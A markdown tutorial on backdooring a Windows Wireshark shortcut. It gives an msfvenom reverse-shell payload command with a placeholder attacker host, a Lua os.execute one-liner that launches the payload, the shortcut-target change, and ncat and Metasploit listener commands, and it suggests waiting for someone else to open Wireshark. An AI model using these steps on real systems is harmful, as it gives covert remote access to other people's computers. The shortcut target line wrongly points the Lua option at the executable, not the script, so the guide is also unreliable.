# Wireshark Reverse Shell on Windows
Thanks to [@netspooky](https://twitter.com/netspooky) for [showing this cool little trick](https://vm.tiktok.com/TTPdrQc8p6/) to pwn computers without even hacking them if you have physical access to them.

You can change the wireshark executable target for a LUA script that will execute another malicious executable on the system.

To achieve the reverse shell we are going to need the following 2 main things.
## The malicious executable
We first need a malicious executable that will be responsible for connecting to our C2 and giving this C2 full remote access.

For this you can either generate an executable with Cobalt Strike, Metasploit Framework or you can just make your own custom malware (stay in legal boundaries).

On this case we'll just use some simple Metasploit Framework generated payload since it's the quickest option, for this run the following command.
```
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip of attacker> LPORT=<port of attacker> -f exe -o burgers.exe
```

Then you can move the malicious executable named `burgers.exe` to your windows target, in our case i will move the `burgers.exe` in the `%TEMP%` directory on windows.

*Note that if you did the same steps as me for the generation of the malicious executable, it will mostly be detected by the antivirus, this is because metasploit payloads are well known by most antivirus out here.*

## The LUA Script
The second thing we need is that LUA Script which will be run everytime someone tries to open wireshark and will be responsible for running the malicious file we created in the previous section.

LUA is a pretty easy programming language, nothing tough here. Just write a small script that can execute another executable on the system.

This can be achieved easily using the following one liner script.
```lua
-- You will have to change %userprofile% by your profile path
os.execute("START /B %userprofile%\\AppData\\Local\\Temp\\burgers.exe")
```

Put this in a file named `wireshark_startup.lua` and put it in the directory you want, in my case i will put it in the windows `%TEMP%` directory.

## Wireshark Weaponization
Now we have everything ready it's time to ***weaponize*** Wireshark. And this has never been simpler.

1. Right click on the Wireshark Executable.
2. Find the **Target** input field, and change it for the following.
```
-X lua_script:%userprofile%\AppData\Local\Temp\burgers.exe
```
3. Apply the changes to the executable.

Wireshark has successfully been weaponized, everytime it will get executed it will also execute our LUA script responsible for executing our malicious executable which will spawn us a shell at `<ip of attacker>:<port of attacker>`.

## Catching Reverse Shells
Now it's time for the fun bit, catching shells ! For this, start your listener at `<ip of attacker>:<port of attacker>`.
```
$ ncat -lnvp 6969
```

If you are using msfconsole payload use the following method instead.
```
$ msfconsole
> use exploit/multi/handler
> set payload windows/x64/shell_reverse_tcp
> set LHOST <ip of attacker>
> set LPORT <port of attacker>
> exploit -j
```

And if you have physical access you can either execute wireshark yourself or wait for someone to execute it and catch shells outside their local area network.
